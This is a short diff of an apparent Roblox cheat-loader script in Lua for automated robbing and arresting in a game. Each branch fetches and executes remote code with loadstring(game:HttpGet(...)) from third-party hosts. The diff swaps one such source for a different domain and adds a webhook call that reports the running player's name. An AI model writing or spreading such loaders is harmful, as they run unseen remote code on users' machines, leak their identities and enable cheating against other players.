@@ -35,8 +35,8 @@ end
 
 local player = game:GetService("Players").LocalPlayer
 
-if test1 == 3 then
-	loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV4'))()
+if test1 == 2 or test1 == 4 then
+	loadstring(game:HttpGet("https://jailhax.lol/scripts/FarmFree.lua"))()
 	sendToWebhook("Executed, Auto Rob User: " .. player.Name)
 else
 	loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoArrestV3'))()
